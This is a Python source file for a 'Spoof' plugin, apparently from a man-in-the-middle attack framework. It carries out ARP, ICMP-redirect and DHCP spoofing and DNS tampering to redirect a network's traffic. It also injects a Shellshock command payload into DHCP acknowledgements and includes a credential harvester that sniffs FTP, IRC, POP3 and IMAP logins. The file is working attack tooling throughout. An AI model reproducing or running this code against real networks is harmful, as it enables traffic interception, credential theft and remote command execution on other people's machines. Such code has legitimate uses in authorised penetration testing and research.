#
# DNS tampering code stolen from https://github.com/DanMcInerney/dnsspoof
#
# CredHarvesting code stolen from https://github.com/DanMcInerney/creds.py
#

from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from plugins.plugin import Plugin
from time import sleep
import dns.resolver
import nfqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
import os
import sys
import threading
from base64 import b64decode
from urllib import unquote
import binascii
import random


class Spoof(Plugin):
    name = "Spoof"
    optname = "spoof"
    desc = 'Redirect/Modify traffic using ICMP, ARP or DHCP'
    has_opts = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface
        self.arp = options.arp
        self.icmp = options.icmp
        self.dns = options.dns
        self.dhcp = options.dhcp
        self.shellshock = options.shellshock
        self.gateway = options.gateway
        #self.summary = options.summary
        self.target = options.target
        self.arpmode = options.arpmode
        self.port = options.listen
        self.hsts = options.hsts
        self.manualiptables = options.manualiptables  #added by alexander.georgiev@daloo.de
        self.debug = False
        self.send = True

        if os.geteuid() != 0:
            sys.exit("[-] Spoof plugin requires root privileges")
 
        if self.options.log_level == 'debug':
            self.debug = True

        try:
            self.mac = get_if_hwaddr(self.interface)
        except Exception, e:
            sys.exit('[-] Error retrieving interfaces MAC address: %s' % e)
        
        if self.arp:
            if not self.gateway:
                sys.exit("[-] --arp argument requires --gateway")

            self.routermac = getmacbyip(self.gateway)
            
            print "[*] ARP Spoofing enabled"
            if self.arpmode == 'req':
                pkt = self.build_arp_req()
            elif self.arpmode == 'rep':
                pkt = self.build_arp_rep()
            
            thread_target = self.send_packets
            thread_args = (pkt, self.interface, self.debug,)

        elif self.icmp:
            if not self.gateway:
                sys.exit("[-] --icmp argument requires --gateway")

            self.routermac = getmacbyip(self.gateway)

            print "[*] ICMP Redirection enabled"
            pkt = self.build_icmp()
            
            thread_target = self.send_packets
            thread_args = (pkt, self.interface, self.debug,)

        elif self.dhcp:
            print "[*] DHCP Spoofing enabled"
            if self.target:
                sys.exit("[-] --target argument invalid when DCHP spoofing")

            self.rand_number = []
            self.dhcp_dic = {}
            self.dhcpcfg = options.configfile['Spoof']['DHCP']
            
            thread_target = self.dhcp_sniff
            thread_args = ()
        
        else:
            sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")

        print "[*] Spoof plugin online"
        if not self.manualiptables:
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')

        if (self.dns or self.hsts):
            print "[*] DNS Tampering enabled"
            
            if self.dns:
                self.dnscfg = options.configfile['Spoof']['DNS']

            self.hstscfg = options.configfile['SSLstrip+']

            if not self.manualiptables:
                os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')

            self.start_dns_queue()

        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
        file.write('1')
        file.close()
        if not self.manualiptables:
            print '[*] Setting up iptables'
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)

        #CHarvester = CredHarvester()
        t = threading.Thread(name='spoof_thread', target=thread_target, args=thread_args)
        #t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))

        t.setDaemon(True)
        t.start()

    def dhcp_rand_ip(self):
        pool = self.dhcpcfg['ip_pool'].split('-')
        trunc_ip = pool[0].split('.'); del(trunc_ip[3])
        max_range = int(pool[1])
        min_range = int(pool[0].split('.')[3])
        number_range = range(min_range, max_range)
        for n in number_range:
            if n in self.rand_number:
                number_range.remove(n)
        rand_number = random.choice(number_range)
        self.rand_number.append(rand_number)
        rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)

        return rand_ip

    def dhcp_callback(self, resp):
        if resp.haslayer(DHCP):
            xid = resp[BOOTP].xid
            mac_addr = resp[Ether].src
            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
            if xid in self.dhcp_dic.keys():
                client_ip = self.dhcp_dic[xid]
            else:
                client_ip = self.dhcp_rand_ip()
                self.dhcp_dic[xid] = client_ip

            if resp[DHCP].options[0][1] == 1:
                logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
                logging.info("Sending DHCP OFFER")
                packet = (Ether(src=get_if_hwaddr(self.interface), dst='ff:ff:ff:ff:ff:ff') /
                IP(src=get_if_addr(self.interface), dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=get_if_addr(self.interface), xid=xid) /
                DHCP(options=[("message-type", "offer"),
                    ('server_id', get_if_addr(self.interface)),
                    ('subnet_mask', self.dhcpcfg['subnet']),
                    ('router', get_if_addr(self.interface)),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240),
                    "end"]))

                try:
                    packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
                except KeyError:
                    pass

                sendp(packet, iface=self.interface, verbose=self.debug)

            if resp[DHCP].options[0][1] == 3:
                logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
                packet = (Ether(src=get_if_hwaddr(self.interface), dst='ff:ff:ff:ff:ff:ff') /
                IP(src=get_if_addr(self.interface), dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=get_if_addr(self.interface), xid=xid) /
                DHCP(options=[("message-type", "ack"),
                    ('server_id', get_if_addr(self.interface)),
                    ('subnet_mask', self.dhcpcfg['subnet']),
                    ('router', get_if_addr(self.interface)),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240)]))

                try:
                    packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
                except KeyError:
                    pass

                if self.shellshock:
                    logging.info("Sending DHCP ACK with shellshock payload")
                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
                    packet[DHCP].options.append("end")
                else:
                    logging.info("Sending DHCP ACK")
                    packet[DHCP].options.append("end")

                sendp(packet, iface=self.interface, verbose=self.debug)

    def dhcp_sniff(self):
        sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=self.interface)

    def send_packets(self, pkt, interface, debug):
        while self.send:
            sendp(pkt, inter=2, iface=interface, verbose=debug)

    def build_icmp(self):
        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=get_if_addr(self.interface)) /\
              IP(src=self.target, dst=self.gateway)/UDP()

        return pkt

    def build_arp_req(self):
        if self.target is None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac is None:
                sys.exit("[-] Error: Could not resolve targets MAC address")

            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target)

        return pkt

    def build_arp_rep(self):
        if self.target is None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac is None:
                sys.exit("[-] Error: Could not resolve targets MAC address")

            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target, op=2)

        return pkt

    def resolve_domain(self, domain):
        try:
            #logging.info("Resolving -> %s" % domain)
            answer = dns.resolver.query(domain, 'A')
            real_ips = []
            for rdata in answer:
                real_ips.append(rdata.address)

            if len(real_ips) > 0:
                return real_ips

        except Exception:
            logging.debug("Error resolving " + domain)

    def nfqueue_callback(self, payload, *kargs):
        data = payload.get_data()
        pkt = IP(data)
        if not pkt.haslayer(DNSQR):
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            #logging.info("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
            if self.dns:
                for k, v in self.dnscfg.items():
                    if k in pkt[DNSQR].qname:
                        self.modify_dns(payload, pkt, v)

            elif self.hsts:
                if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
                    for k,v in self.hstscfg.items():
                        if v == pkt[DNSQR].qname[:-1]:
                            ip = self.resolve_domain(k)
                            if ip:
                                self.modify_dns(payload, pkt, ip)

                    if 'wwww' in pkt[DNSQR].qname:
                        ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
                        if ip:
                            self.modify_dns(payload, pkt, ip)

                    if 'web' in pkt[DNSQR].qname:
                        ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
                        if ip:
                            self.modify_dns(payload, pkt, ip)

    def modify_dns(self, payload, pkt, ip):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)

        if self.hsts:
            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
            for i in ip:
                spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))

            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
            logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))

        if self.dns:
            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
            logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))

    def start_dns_queue(self):
        self.q = nfqueue.queue()
        self.q.set_callback(self.nfqueue_callback)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)

    def fileno(self):
        return self.q.get_fd()

    def doRead(self):
        self.q.process_pending(100)

    def connectionLost(self, reason):
        reactor.removeReader(self)

    def logPrefix(self):
        return 'queue'

    def add_options(self, options):
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
        group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
        group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
        options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
        options.add_argument('--target', dest='target', help='Specify a host to poison [default: subnet]')
        options.add_argument('--arpmode', dest='arpmode', default='req', help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
        options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
        #options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')

    def finish(self):
        self.send = False
        sleep(3)
        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
        file.write('0')
        file.close()
        if not self.manualiptables:
            print '\n[*] Flushing iptables'
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')

        if (self.dns or self.hsts):
            try:
                self.q.unbind(socket.AF_INET)
                self.q.close()
            except:
                pass

        if self.arp:
            print '[*] Re-arping network'
            pkt = Ether(src=self.routermac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.gateway, hwsrc=self.routermac, op=2)
            sendp(pkt, inter=1, count=5, iface=self.interface)

class CredHarvester():

    fragged = 0
    imapauth = 0
    popauth = 0
    ftpuser = None # Necessary since user and pass come in separate packets
    ircnick = None # Necessary since user and pass come in separate packets
    # For concatenating fragmented packets
    prev_pkt = {6667:{}, # IRC
                143:{},  # IMAP
                110:{},  # POP3
                26:{},   # SMTP
                25:{},   # SMTP
                21:{}}   # FTP

    def start(self, interface):
        sniff(prn=self.pkt_sorter, iface=interface)

    def pkt_sorter(self, pkt):
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            self.dest    = pkt[IP].dst
            self.src     = pkt[IP].src
            self.dport   = pkt[TCP].dport
            self.sport   = pkt[TCP].sport
            self.ack     = pkt[TCP].ack
            self.seq     = pkt[TCP].seq
            self.load    = str(pkt[Raw].load)

            if self.dport == 6667:
                """ IRC """
                port = 6667
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                return self.irc(port)

            elif self.dport == 21 or self.sport == 21:
                """ FTP """
                port = 21
                self.prev_pkt[port] = self.frag_joiner(port) # No headers in FTP so no need for hb_parse
                self.ftp(port)

            elif self.sport == 110 or self.dport == 110:
                """ POP3 """
                port = 110
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                self.mail_pw(port)

            elif self.sport == 143 or self.dport == 143:
                """ IMAP """
                port = 143
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                self.mail_pw(port)

    def headers_body(self, protocol):
        try:
            h, b = protocol.split("\r\n\r\n", 1)
            return h, b
        except Exception:
            h, b = protocol, ''
            return h, b

    def frag_joiner(self, port):
        self.fragged = 0
        if len(self.prev_pkt[port]) > 0:
            if self.ack in self.prev_pkt[port]:
                self.fragged = 1
                return {self.ack:self.prev_pkt[port][self.ack]+self.load}
        return {self.ack:self.load}

    def hb_parse(self, port):
        self.prev_pkt[port] = self.frag_joiner(port)
        self.headers, self.body = self.headers_body(self.prev_pkt[port][self.ack])
        return self.headers.split('\r\n')

    def mail_pw(self, port):
        load = self.load.strip('\r\n')

        if self.dport == 143:
            auth_find = 'authenticate plain'
            proto = 'IMAP'
            auth = self.imapauth
            self.imapauth = self.mail_pw_auth(load, auth_find, proto, auth, port)

        elif self.dport == 110:
            auth_find = 'AUTH PLAIN'
            proto = 'POP'
            auth = self.popauth
            self.popauth = self.mail_pw_auth(load, auth_find, proto, auth, port)

    def mail_pw_auth(self, load, auth_find, proto, auth, port):
        if auth == 1:
            user, pw = load, 0
            logging.warning('[%s] %s auth: %s' % (self.src, proto, load))
            self.b64decode(load, port)
            return 0

        elif auth_find in load:
            return 1

    def b64decode(self, load, port):
        b64str = load
        try:
            decoded = b64decode(b64str).replace('\x00', ' ')[1:] # delete space at beginning
        except Exception:
            decoded = ''
        # Test to see if decode worked
        if '@' in decoded:
            logging.debug('%s Decoded: %s' % (self.src, decoded))
            decoded = decoded.split()

    def ftp(self, port):
        """Catch FTP usernames, passwords, and servers"""
        load = self.load.replace('\r\n', '')

        if port == self.dport:
            if 'USER ' in load:
                    user = load.strip('USER ')
                    logging.warning('[%s > %s] FTP user:    ' % (self.src, self.dest), user)
                    self.ftpuser = user

            elif 'PASS ' in load:
                    pw = load.strip('PASS ')
                    logging.warning('[%s > %s] FTP password:' % (self.src, self.dest), pw)

    def irc(self, port):
        load = self.load.split('\r\n')[0]

        if 'NICK ' in load:
            self.ircnick = load.strip('NICK ')
            logging.warning('[%s > %s] IRC nick: %s' % (self.src, self.dest, self.ircnick))

        elif 'NS IDENTIFY ' in load:
            ircpass = load.strip('NS IDENTIFY ')
            logging.warning('[%s > %s] IRC password: %s' % (self.src, self.dest, ircpass))